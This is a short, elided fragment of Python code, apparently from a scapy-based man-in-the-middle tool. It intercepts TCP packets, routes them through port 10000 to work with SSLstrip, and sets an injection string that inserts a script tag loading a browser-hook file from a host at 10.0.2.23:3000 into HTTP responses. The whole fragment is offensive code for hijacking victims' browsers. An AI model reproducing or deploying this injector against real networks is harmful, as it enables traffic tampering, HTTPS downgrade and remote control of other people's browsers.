...
def process_packet(packet):
    ...
    if scapy_packet.haslayer(scapy.Raw):
        ...
        try:
            ...
            if scapy_packet[scapy.TCP].dport == 10000:    # making it work with HTTPS (SSLSTRIP)
            ...
            elif scapy_packet[scapy.TCP].sport == 10000:   # making it work with HTTPS (SSLSTRIP)

                print("[+]Response")

                injection_code = '<script src="http://10.0.2.23:3000/hook.js"></script>'
